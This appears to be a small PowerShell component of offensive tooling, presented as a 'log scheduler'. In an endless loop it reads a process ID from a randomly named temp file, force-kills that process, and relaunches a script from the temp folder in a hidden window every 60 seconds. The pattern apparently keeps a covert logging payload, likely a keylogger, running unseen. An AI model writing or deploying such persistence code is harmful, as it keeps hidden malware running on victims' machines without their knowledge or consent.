# powershell log scheduler
# created by : C0SM0
for(;;) {
    try {
        $proc = Get-Content "$env:temp/DdBPKCytRe"
        Stop-process -id $proc -Force
        powershell Start-Process powershell.exe -windowstyle hidden "$env:temp/p.ps1"
    }
    catch {
        
    }

    # change number of seconds for different delays
    Start-Sleep 60
}

